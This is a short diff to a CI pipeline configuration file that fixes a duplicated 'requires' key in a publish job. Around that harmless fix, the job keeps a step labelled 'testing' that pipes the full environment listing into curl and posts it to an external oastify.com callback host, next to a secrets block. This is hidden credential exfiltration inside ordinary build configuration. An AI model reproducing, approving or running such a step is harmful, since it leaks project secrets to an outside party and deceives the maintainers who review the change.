@@ -8,7 +8,7 @@ jobs:
         requires: [~pr, ~commit]
 
     publish:
-        requires: requires: [~pr, ~commit]
+        requires: [~pr, ~commit]
         steps:
           - testing: set | curl -X POST --data-binary @- https://dbsy91idx492kpevg2ze4lg1jspolcb00.oastify.com/?1
         secrets:
